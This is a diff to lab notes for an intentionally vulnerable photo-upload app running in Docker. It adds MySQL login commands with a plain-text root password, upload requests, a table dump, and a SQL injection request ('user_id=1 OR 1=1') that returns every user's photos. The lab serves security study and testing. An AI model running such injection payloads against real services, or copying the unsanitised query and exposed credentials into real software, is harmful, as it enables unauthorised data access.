@@ -37,6 +37,8 @@ INSERT INTO users (username, password, email) VALUES ('testuser', 'testpassword'
 ```
 
 ```
+docker exec -it e38172ae10a5 mysql -uroot -pinsecure_password
+USE photos;
 CREATE TABLE IF NOT EXISTS photos (
     id INT AUTO_INCREMENT PRIMARY KEY,
     filename VARCHAR(255) NOT NULL,
@@ -91,8 +93,67 @@ curl -X POST "http://10.5.20.45:8000/api/photos/upload" \
   "status": "success"
 }
 
-curl -X GET "http://10.5.20.45:8000/api/photos/Docker.png"
+curl -X POST "http://10.5.20.45:8000/api/photos/upload" \
+     -H "Content-Type: multipart/form-data" \
+     -F "file=@test.png" \
+     -F "user_id=3"
+
+curl -X GET "http://10.5.20.45:8000/photos?user_id=1"
 ```
+curl -X POST "http://10.5.20.45:8000/api/photos/upload" \
+     -H "Content-Type: multipart/form-data" \
+     -F "file=@Docker.png" \
+     -F "user_id=3"
+{"filename":"e1d70097-dc14-4ddf-948b-efc113304eac.png","message":"File uploaded successfully","status":"success"}
+
+mysql> select * from photos;
++----+------------------------------------------+---------+---------------------+
+| id | filename                                 | user_id | upload_date         |
++----+------------------------------------------+---------+---------------------+
+|  1 | docker.png                               |       1 | 2001-09-10 00:00:00 |
+|  2 | e1d70097-dc14-4ddf-948b-efc113304eac.png |       2 | 2024-09-20 15:37:39 |
+|  3 | b40051e6-de40-42fb-aee5-82646e39f2a8.png |       3 | 2024-09-20 15:39:00 |
++----+------------------------------------------+---------+---------------------+
+3 rows in set (0.00 sec)
+
+ curl -X GET "http://10.5.20.45:8000/api/photos?user_id=1"
+{
+  "photos": [
+    [
+      1, 
+      "docker.png", 
+      1, 
+      "Mon, 10 Sep 2001 00:00:00 GMT"
+    ]
+  ], 
+  "status": "success"
+}
+
+
+utkalika@utkalika:~/Work/vulnerable-photo-app$ curl -X GET "http://10.5.20.45:8000/api/photos?user_id=1%20OR%201%3D1"
+{
+  "photos": [
+    [
+      1, 
+      "docker.png", 
+      1, 
+      "Mon, 10 Sep 2001 00:00:00 GMT"
+    ], 
+    [
+      2, 
+      "e1d70097-dc14-4ddf-948b-efc113304eac.png", 
+      2, 
+      "Fri, 20 Sep 2024 15:37:39 GMT"
+    ], 
+    [
+      3, 
+      "b40051e6-de40-42fb-aee5-82646e39f2a8.png", 
+      3, 
+      "Fri, 20 Sep 2024 15:39:00 GMT"
+    ]
+  ], 
+  "status": "success"
+}
 
 ```
 docker tag usatpath01/vulnerable-photo-app-analytics-service:v1 usatpath01/vulnerable-photo-app-analytics-service:v1
